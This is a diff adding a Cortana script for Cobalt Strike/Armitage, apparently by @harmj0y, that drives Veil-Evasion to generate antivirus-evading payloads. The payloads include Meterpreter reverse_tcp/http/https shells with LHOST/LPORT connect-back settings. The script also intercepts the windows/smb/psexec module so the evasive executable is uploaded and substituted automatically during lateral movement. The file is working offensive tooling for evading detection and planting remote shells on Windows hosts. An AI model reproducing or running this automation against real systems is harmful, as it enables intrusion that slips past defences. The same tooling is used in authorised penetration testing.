@@ -1,0 +1,739 @@
+#
+# Invokes Veil-Evasion to generate AV-evading payloads.
+# Payloads can be set to be substituted into PSEXEC
+# calls on the fly.
+#
+# The configuration for a generated payload is preserved,
+# even between Cobalt Strike/Armitage restarts.
+#
+#
+# Double-clicking Payload or MSFPayload will bring up
+# appropriate options.
+#
+# Double-clicking LHOST will reset the LHOST variable to
+# the local IP.
+#
+#
+# Author: @harmj0y 
+#
+
+
+# needed imports for custom menu creation
+import java.awt.*; # for borderlayout
+import javax.swing.*; # for jpanel
+import javax.swing.table.*; #tablerowsorter
+import table.*; # generictablemodel
+import ui.*; #atable
+
+global('$veilpath $psexecPayloadPath $version $veilpath %currentVeilPayload');
+$psexecPayloadPath = "";
+$veilpath = "";
+
+# the currently selected payload
+# format is:
+#   payload => "veil_payload"
+#   msfpayload => "windows/meterpreter/blah"
+#   lhost => "192.168.1.1"
+#   lport => "4444"
+#   outputbase => "payload"
+#   overwrite => true
+#   psexec => false
+%currentVeilPayload = %();
+
+
+###################################################
+#
+# "Main" event triggers
+#
+###################################################
+
+on ready {
+    
+    global('$veilpath %currentVeilPayload');
+    $veilpath = data_list("veilpath")[0];
+
+    # if there's no existing veilpath set, prompt for it
+    # and save it back to the database
+    if (!$veilpath){
+        prompt_veil_path();
+    }
+
+    # if we get a null veil_evasion version, prompt
+    $veil_evasion_version = get_veil_evasion_version();
+    if ($veil_evasion_version eq ""){
+        prompt_veil_path();
+    }
+
+    # check the version again, exit if empty
+    $veil_evasion_version = get_veil_evasion_version();
+    if ($veil_evasion_version eq ""){
+        println("[*]");
+        println("[!] Please install Veil-Evasion!");
+        println("[*]");
+        exit();
+    }
+
+    # restore the current payload configuration from the database
+    %currentVeilPayload = data_list("currentVeilPayload")[0];
+
+    println("[*]");
+    println("[*] Current path: $veilpath");
+    println("[*]");
+    println("[+] Veil-Evasion v$veil_evasion_version Loaded");
+    println("[*]");
+}
+
+
+
+
+# catches user-launched psexec actions so we can modify-in-place
+filter user_launch {
+
+    # variable $2 -> the module launched by the user
+    # variable $3 -> the options for the module, including ['PAYLOAD']
+
+    # catch the two psexec launches and modify them to use Veil
+    if ($2 eq "windows/smb/psexec") {
+
+        # handle "windows/local/current_user_psexec" ?
+        local('$payloadpath $payload_server_path');
+        global('$psexecPayloadPath');
+
+        if ($psexecPayloadPath ne ""){
+            # if a custom EXE is not specified, use our Veil payload
+            if ($3['EXE::Custom'] eq ""){
+
+                $payloadpath = $psexecPayloadPath;
+
+                # mark this file for deletion later when Cortana exits
+                delete_later($payloadpath);
+
+                # upload the .exe to the server
+                $payload_server_path = file_put($payloadpath);
+
+                # make sure a payload path was returned
+                if ($payloadpath ne ""){
+                    # swap options in place.
+                    println("[*] Substituting in psexec payload: $payload_server_path");
+                    $3['EXE::Custom'] = $payload_server_path;
+                }
+            }
+        }
+    }
+
+    # return all of our arguments
+    return @_;
+}
+
+
+###################################################
+#
+# User interaction methods.
+#
+###################################################
+
+# prompt the user to choose which listener to use to
+# generate the Veil payload
+sub prompt_listener {
+
+    local('@raw_data @raw_listeners @listeners');
+    
+    @raw_data = data_list("cloudstrike.listeners");
+    @raw_listeners = split('!!', @raw_data[0]);
+    @listeners = @();
+
+    foreach $raw_listener (@raw_listeners) {
+        if ($raw_listener ne "") {
+            local('$name $payload $port $migrate $null $null $domains %beacon %listener');
+            ($name, $payload, $port, $migrate, $null, $null, $domains) = split('@@', $raw_listener);
+            $s = size(split('@@', $raw_listener));
+
+            # if we have a beacon listener
+            if ($s == 7){
+                ($name, $payload, $port, $migrate, $host1, $host2, $host3) = split('@@', $raw_listener);
+                %beacon = %(name => $name, payload => $payload, host => $host1, port => $port);
+                push(@listeners, %beacon);
+            }
+
+            # otherwise a meterpreter listener
+            else {
+                ($name, $payload, $port, $migrate, $host, $null) = split('@@', $raw_listener);
+                %listener = %(name => $name, payload => $payload, host => $host, port => $port);
+                push(@listeners, %listener);
+            }
+        }
+    }
+    prompt_list("Listener to Use", @("Use", "Cancel"), @('name', 'payload', 'host', 'port'), @listeners, 900, 800);
+}
+
+# prompt the user for their Veil install path and
+# save the results back into the database
+sub prompt_veil_path {
+    global('$veilpath');
+    $veilpath = prompt_text("Enter path to Veil-Evasion.py", "/root/Veil/Veil-Evasion/Veil-Evasion.py");
+
+    # clear out the veilpath in the DB
+    data_clear("veilpath");
+    # refresh the veilpath in the DB
+    data_add("veilpath",  $veilpath);
+}
+
+
+# choose a particular Veil payload from a dynamically generate
+# list and fill in the value into the calling table
+sub chooseVeilPayload {
+    
+    # TODO: redo the local variables
+    local('$cmd $handle @out $setPsexec @payloads $a $trimmed');
+    global('$veilpath');
+
+    # Veil command to list all payloads
+    $cmd = $veilpath." -p";
+    $handle = exec($cmd);
+    wait($handle);
+    @out = readAll($handle);
+    closef($handle);
+
+    $setPsexec = $1;
+    @payloads = @();
+
+    # read Veil's output and parse out each payload, adding it to the array
+    foreach $line (@out){
+        if (($line hasmatch "\\)") && ($line !hasmatch "powershell") && ($line !hasmatch "native")){
+            $a = substr($line, find($line, '\t', 2));
+            # trim out leading/trailing whitespace
+            $trimmed = replace($a, '\s', '');
+            push(@payloads, %(payload => $trimmed));
+        }
+    }
+
+    # first col argument -> data that's returned when "select" is chosen
+    quickListDialog("Choose a Payload", "Select", @("payload", "payload"), @payloads, $width => 350, $height => 240, lambda({
+        [$call : $1];
+    }, $call => $4), \$tablef);
+}
+
+# choose a particular msfpayload from a list and fill 
+# the value into the calling table
+sub chooseMSFPayload {
+    
+    local('@msfpayloads');
+    @msfpayloads = @(
+        %(msfpayload => "windows/meterpreter/reverse_tcp"),
+        %(msfpayload => "windows/meterpreter/reverse_http"),
+        %(msfpayload => "windows/meterpreter/reverse_https"),
+        %(msfpayload => "windows/meterpreter/reverse_ipv6_tcp"),
+        %(msfpayload => "windows/meterpreter/reverse_ipv6_http"),
+        %(msfpayload => "windows/meterpreter/reverse_ipv6_https"),
+        %(msfpayload => "windows/shell/reverse_tcp"),
+        %(msfpayload => "")
+    );
+
+    # first col argument -> data that's returned when "select" is chosen
+    quickListDialog("Choose a MSFPayload", "Select", @("msfpayload", "msfpayload"), @msfpayloads, $width => 350, $height => 240, lambda({
+        [$call : $1];
+    }, $call => $4), \$tablef);
+}
+
+
+# Main user-interaction dialog 
+#
+# adapted from armitage/scripts/attacks.sl
+# thanks for the bsd license raffi :)
+#
+sub veil_dialog {
+
+    local('$center $south $c $x $generateButton');
+    global('%currentVeilPayload');
+
+    # main title and dimensions of the dialog box
+    $dialog = dialog("Veil-Evasion", 590, 280);
+
+    # if there isn't a last-generated veil payload, throw some defaults in
+    if (!%currentVeilPayload){
+        %currentVeilPayload["payload"] = "python/shellcode_inject/aes_encrypt";
+        %currentVeilPayload["msfpayload"] = "windows/meterpreter/reverse_tcp";
+        %currentVeilPayload["lhost"] = lhost();
+        %currentVeilPayload["lport"] = 4444;
+        %currentVeilPayload["outputbase"] = "payload";
+        %currentVeilPayload["overwrite"] = true;
+        %currentVeilPayload["psexec"] = false;
+    }
+
+    # build out the option list table for the specified payload
+    $model = [new GenericTableModel: @("Option", "Value"), "Option", 128];
+    [$model setCellEditable: 1];
+
+    [$model _addEntry: %(Option => "Payload", Value => %currentVeilPayload["payload"], Tooltip => "Veil-Evasion Payload", Hide => '0')];
+    [$model _addEntry: %(Option => "MSFPayload", Value => %currentVeilPayload["msfpayload"], Tooltip => "msfpayload to use (if applicable)", Hide => '0')];
+    [$model _addEntry: %(Option => "LHOST", Value => %currentVeilPayload["lhost"], Tooltip => "LHOST to connect back to", Hide => '0')];
+    [$model _addEntry: %(Option => "LPORT", Value => %currentVeilPayload["lport"], Tooltip => "LPORT to connect back to", Hide => '0')];
+    [$model _addEntry: %(Option => "OutputBase", Value => %currentVeilPayload["outputbase"], Tooltip => "Base name for generated payloads", Hide => '0')];
+
+    $table = [new ATable: $model];
+
+    # add in the handler to manage clicks on each option
+    valueListener($table, $model);
+
+    # set up the panes
+    $center = [new JScrollPane: $table];
+    $south = [new JPanel];
+    [$south setLayout: [new BoxLayout: $south, [BoxLayout Y_AXIS]]];
+
+    # [$south setLayout: [new GridLayout: 3, 1]]; # original -> more rows
+    [$south setLayout: [new GridLayout: 3, 1]];
+
+    $c = [new JPanel];
+    [$c setLayout: [new FlowLayout: [FlowLayout CENTER]]];
+
+    # our buttons
+    $generateButton = [new JButton: "Generate"];
+    $listenerButton = [new JButton: "Use Listener"];
+
+    # overwrite checkbox
+    $overwriteCheckbox = [new JCheckBox: " Overwrite Payloads"];
+    if (%currentVeilPayload["overwrite"]){
+        [$overwriteCheckbox setSelected: 1];
+    }
+    else{
+        [$overwriteCheckbox setSelected: 0];
+    }
+
+    # psexec checkbox
+    $psexecCheckbox = [new JCheckBox: " Set as PSEXEC Payload"];
+    if (%currentVeilPayload["psexec"]){
+        [$psexecCheckbox setSelected: 1];
+    }
+    else{
+        [$psexecCheckbox setSelected: 0];
+    }
+
+    # add a lambda listener to trigger the generation of our Veil payload
+    [$generateButton addActionListener: lambda({
+        
+        syncTable($table);
+        $options = %();
+
+        # grab all the filled in option values from the table
+        for ($x = 0; $x < [$model getRowCount]; $x++) {
+            $options[ [$model getValueAt: $x, 0] ] = [$model getValueAt: $x, 1];
+        }
+
+        # kick off out payload generation
+        # checkbox values => [$overwriteCheckbox isSelected]
+        generatePayload($options["Payload"], $options["MSFPayload"], $options["LHOST"], $options["LPORT"], $options["OutputBase"], [$overwriteCheckbox isSelected], [$psexecCheckbox isSelected]);
+        [$dialog setVisible: 0]; # close the dialog off
+        })];
+
+    # fire off the listener prompt
+    [$listenerButton addActionListener: lambda({
+        prompt_listener();
+        [$dialog setVisible: 0]; # close the dialog off
+        })];
+
+    # add the buttons to the frame
+    [$c add: $generateButton];
+    [$c add: $listenerButton];
+
+    # add the southern frame that contains the action buttons
+    [$south add: left($overwriteCheckbox)];
+    [$south add: left($psexecCheckbox)];
+    [$south add: $c];
+
+    local('$s');
+    $s = [new JSplitPane: [JSplitPane VERTICAL_SPLIT], $north, $center];
+    [$center setPreferredSize: [new Dimension: 0, 0]];
+    # [$north setPreferredSize: [new Dimension: 590, 30]]; # description area
+    [$s resetToPreferredSizes];
+    [$s setOneTouchExpandable: 1];
+
+    [$dialog add: $s, [BorderLayout CENTER]];   
+    [$dialog add: $south, [BorderLayout SOUTH]];
+
+    [$generateButton requestFocus];
+    [$dialog setVisible: 1];
+}
+
+
+###################################################
+#
+# Payload generation.
+#
+###################################################
+
+# build the Veil command to execute and return the 
+# path of the payload .exe
+# arguments -> 
+#       $1 : lhost
+#       $2 : lport
+#       $3 : the specified payload
+#       $4 : the output base name
+#       $5 : the msfpayload
+#       $6 : whether to overwrite
+#       $7 : whether we're doing this for psexec, true/false
+#
+sub generatePayload {
+    
+    local('$payload $msfpayload $lhost $lport $outputbase $overwrite $usePsexec $veilcmd @out $handle $line $payloadpath');
+    global('$veilpath $psexecPayloadPath %currentVeilPayload');
+
+    $payload = $1;
+    $msfpayload = $2;
+    $lhost = $3;
+    $lport = $4;
+    $outputbase = $5;
+    $overwrite = $6;
+    $usePsexec = $7;
+
+    # set the current payload to these options and refresh the database
+    %currentVeilPayload["payload"] = $payload;
+    %currentVeilPayload["msfpayload"] = $msfpayload;
+    %currentVeilPayload["lhost"] = $lhost;
+    %currentVeilPayload["lport"] = $lport;
+    %currentVeilPayload["outputbase"] = $outputbase;
+    %currentVeilPayload["overwrite"] = $overwrite;
+    %currentVeilPayload["psexec"] = $usePsexec;
+    refreshCurrentPayload(); # refresh the DB
+
+    # default to a meterpreter payload
+    $veilcmd = $veilpath." -p $payload -c LHOST=$lhost LPORT=$lport -o $outputbase";
+
+    # if we have a shellcode payload, use this command instead
+    if($payload hasmatch "shellcode"){
+        $veilcmd = $veilpath." -p $payload --msfpayload $msfpayload --msfoptions LHOST=$lhost LPORT=$lport PrependMigrate=true -o $outputbase";
+    }
+
+    # check if we're overwrite the produced payload
+    if ($overwrite){
+        $veilcmd = $veilcmd . " --overwrite"
+    }
+
+    # execute the Veil command and get the path of .exe generated
+    println("[*] Executing Veil command: \"$veilcmd\"");
+    $handle = exec($veilcmd);
+    wait($handle);
+    @out = readAll($handle);
+    closef($handle);
+    $payloadpath = "";
+
+    # read Veil's output and try to parse out the .exe path
+    foreach $line (@out){
+        if (find($line, 'Executable written to')){
+            $payloadpath = substr($line, indexOf($line, "/"), lindexOf($line, "exe") ) ."exe";
+        }
+    }
+    
+    # $saveto = prompt_file_save("payload.exe"); ?
+    # show_message("output: $payloadpath", "Veil-Evasion");
+    prompt_text("output:", $payloadpath);
+
+    # if we're using this for psexec, set everything up for substitution
+    if ($usePsexec){
+        $psexecPayloadPath = $payloadpath;
+    }
+}
+
+
+###################################################
+#
+# Menu Modifications
+#
+###################################################
+
+menubar("Veil-Evasion", "veilinterface", 2);
+
+# modify the main "Attacks" menu
+popup veilinterface {
+    item "Generate" {
+        veil_dialog();
+    }
+    item "Current PSEXEC Payload" {
+        global('$psexecPayloadPath');
+        # clear out the text if you want to clear the psexec payload used
+        $psexecPayloadPath = prompt_text("Current PSEXEC Payload:", $psexecPayloadPath);
+    }
+    item "Set Veil-Evasion Path" {
+        prompt_veil_path();
+    }
+}
+
+
+###################################################
+#
+# Misc helpers
+#
+###################################################
+
+# try to extract the version number from Veil-Evasion
+sub get_veil_evasion_version {
+
+    local('$cmd $handle @out $trimmed $version');
+    global('$veilpath');
+
+    $version = "?";
+
+    # Veil command to list all payloads
+    $cmd = $veilpath." -p";
+    $handle = exec($cmd);
+    wait($handle);
+    @out = readAll($handle);
+    closef($handle);
+
+    # extract the version number, if possible
+    foreach $line (@out){
+        if (find($line, 'Version')){
+            $version = substr($line, find($line, ':') + 2);
+        }
+    }
+    return $version;
+}
+
+# clear out the database object and put the current
+# payload object in
+sub refreshCurrentPayload {
+
+    global('%currentVeilPayload');
+
+    # clear out the DB value
+    data_clear("currentVeilPayload");
+
+    # refresh the current veil payload in the DB
+    data_add("currentVeilPayload",  %currentVeilPayload);
+}
+
+# adapted from addFileListener() in armitage/scripts/attacks.sl
+# listener method for when an option is double clicked in the
+# main dialoag menu
+sub valueListener {
+    local('$table $model $actions');
+    ($table, $model, $actions) = @_; 
+
+    if ($actions is $null) {
+        $actions = %();
+    }
+
+    # when LHOST is clicked, revert back to lhost() value
+    $actions["LHOST"] = { [$4: lhost()]; };
+
+    # set our lambdas functions for when these values are clicked
+    $actions["Payload"] = lambda(&chooseVeilPayload);
+    $actions["MSFPayload"] = lambda(&chooseMSFPayload);
+
+    # helping logic for mouse interaction
+    addMouseListener($table, lambda({
+        if ($0 eq 'mouseClicked' && [$1 getClickCount] >= 2) {
+            local('$type $row $action $change $value');
+
+            $value = [$model getSelectedValueFromColumn: $table, "Value"];
+            $type = [$model getSelectedValueFromColumn: $table, "Option"];
+            $row = [$model getSelectedRow: $table];
+
+            # look for a direct match first
+            foreach $action => $change ($actions) {
+                if ($action eq $type) {
+                    [$change: $type, $value, $row, lambda({
+                        [$model setValueAtRow: $row, "Value", "$1"];
+                        [$model fireListeners];
+                    }, \$model, \$row)];
+                    return;
+                }
+            }
+
+            # fall back to looking for a wildcard match
+            foreach $action => $change ($actions) {
+                if ($action iswm $type) {
+                    [$change: $type, $value, $row, lambda({;
+                        [$model setValueAtRow: $row, "Value", "$1"];
+                        [$model fireListeners];
+                    }, \$model, \$row)];
+                    return;
+                }
+            }
+        }
+    }, \$model, \$table, \$actions));
+}
+
+# called by "prompt_list"  when a user selects a button
+on item_selected {
+    # prompt_listener(), set the handler as passed
+    if ($1 eq "Use"){
+        # prompt the veil_dialog from the listener information
+        dialog_from_listener($3);
+    }
+}
+
+# do some logic to set values based on the listener specified
+# and then call the veil_dialog prompt
+sub dialog_from_listener {
+
+    local('@listener $name $payload $lhost $lport');
+    global('%currentVeilPayload');
+
+    @listener = $1;
+
+    # make sure we were passed a listener
+    if (size(@listener) > 0){
+        ($name, $payload, $lhost, $lport) = @listener;
+
+        # logic to try to set specific options for various listeners
+        if (find($payload, 'reverse_tcp')) {
+            %currentVeilPayload["payload"] = "c/meterpreter/rev_tcp_service";
+            %currentVeilPayload["msfpayload"] = "n/a";
+            %currentVeilPayload["lhost"] = $lhost;
+            %currentVeilPayload["lport"] = $lport;
+            %currentVeilPayload["outputbase"] = "psexec";
+            %currentVeilPayload["overwrite"] = true;
+            %currentVeilPayload["psexec"] = true;
+            veil_dialog();
+        }
+        else if (find($payload, 'reverse_https')) {
+            %currentVeilPayload["payload"] = "python/shellcode_inject/aes_encrypt";
+            %currentVeilPayload["msfpayload"] ="windows/meterpreter/reverse_https";
+            %currentVeilPayload["lhost"] = $lhost;
+            %currentVeilPayload["lport"] = $lport;
+            %currentVeilPayload["outputbase"] = "psexec";
+            %currentVeilPayload["overwrite"] = true;
+            %currentVeilPayload["psexec"] = true;
+            veil_dialog();
+        }
+        else if (find($payload, 'reverse_http')) {
+            %currentVeilPayload["payload"] = "python/shellcode_inject/aes_encrypt";
+            %currentVeilPayload["msfpayload"] ="windows/meterpreter/reverse_http";
+            %currentVeilPayload["lhost"] = $lhost;
+            %currentVeilPayload["lport"] = $lport;
+            %currentVeilPayload["outputbase"] = "psexec";
+            %currentVeilPayload["overwrite"] = true;
+            %currentVeilPayload["psexec"] = true;
+            veil_dialog();
+        }
+        else{
+            show_message("Warning: listener not currently supported!");
+        }
+    }
+}
+
+
+###################################################
+#
+# GUI Helper Methods
+#   these are all from armitage/scripts/gui.sl
+#
+###################################################
+
+# creates a list dialog, from armitage/scripts/gui.sl
+# $1 = title, $2 = button text, $3 = columns, $4 = rows, $5 = callback
+sub quickListDialog {
+    local('$dialog $panel $table $row $model $button $sorter $after $a $tablef');
+    $dialog = dialog($1, $width, $height);
+    $panel = [new JPanel];
+    [$panel setLayout: [new BorderLayout]];
+    
+    ($table, $model) = setupTable($3[0], sublist($3, 1), $4);
+    [$panel add: [new JScrollPane: $table], [BorderLayout CENTER]];
+
+    if ($tablef !is $null) {
+        [$tablef: $table, $model];
+    }
+    
+    $button = [new JButton: $2];
+    [$button addActionListener: lambda({
+        [$callback : [$model getSelectedValueFromColumn: $table, $lead], $table, $model]; 
+        [$dialog setVisible: 0];
+    }, \$dialog, $callback => $5, \$model, \$table, $lead => $3[0])];
+
+    local('$south');
+    $south = [new JPanel];
+        [$south setLayout: [new BoxLayout: $south, [BoxLayout Y_AXIS]]];
+
+    if ($after !is $null) {
+        foreach $a ($after) {
+            [$south add: $a];
+        }
+    }
+    [$south add: center($button)];
+
+    [$panel add: $south, [BorderLayout SOUTH]];
+    [$dialog add: $panel, [BorderLayout CENTER]];
+    [$dialog show];
+    [$dialog setVisible: 1];
+}
+
+# from armitage/scripts/gui.sl
+sub setupTable {
+    local('$table $model $sorter $row $index $col');
+    $model = [new GenericTableModel: $2, $1, 8];
+    foreach $row ($3) {
+        [$model _addEntry: $row];
+        }
+
+    $table = [new ATable: $model];
+    [[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];
+    $sorter = [new TableRowSorter: $model];
+    [$table setRowSorter: $sorter];
+
+    # make sure our columns have sorters that make sense
+    foreach $index => $col ($2) {
+        if ($col eq "session_host" || $col eq "host" || $col eq "Host") {
+            [$sorter setComparator: $index, &compareHosts];
+        }
+        else if ($col eq "port" || $col eq "sid" || $col eq "Port") {
+            [$sorter setComparator: $index, { return $1 <=> $2; }];
+        }
+    }
+    
+    return @($table, $model);
+}
+
+# from armitage/scripts/gui.sl
+sub center {
+    local('$panel $c');
+    $panel = [new JPanel];
+    [$panel setLayout: [new FlowLayout: [FlowLayout CENTER]]];
+
+    foreach $c (@_) {
+        [$panel add: $c];
+    }
+
+    return $panel;
+}
+
+# from armitage/scripts/gui.sl
+sub left {
+    local('$panel $c');
+    $panel = [new JPanel];
+    [$panel setLayout: [new FlowLayout: [FlowLayout LEFT]]];
+
+    foreach $c (@_) {
+        [$panel add: $c];
+    }
+
+    return $panel;
+}
+
+# from armitage/scripts/gui.sl
+sub syncTable {
+    if ([$1 isEditing]) {
+        [[$1 getCellEditor] stopCellEditing];
+    }
+}
+
+# helper, from armitage/scripts/gui.sl
+sub addMouseListener {
+    [$1 addMouseListener: [new SafeMouseListener: $2]];
+}
+
+# helper, from armitage/scripts/gui.sl
+sub dialog {
+    local('$dialog');
+        $dialog = [new JDialog: $__frame__, $1];
+        [$dialog setSize: $2, $3];
+        [$dialog setLayout: [new BorderLayout]];
+        [$dialog setLocationRelativeTo: $__frame__];
+    return $dialog;
+}
+
+# helpers, from armitage/scripts/gui.sl
+sub tableRenderer {
+    return [ATable getDefaultTableRenderer: $1, $2];
+}
+
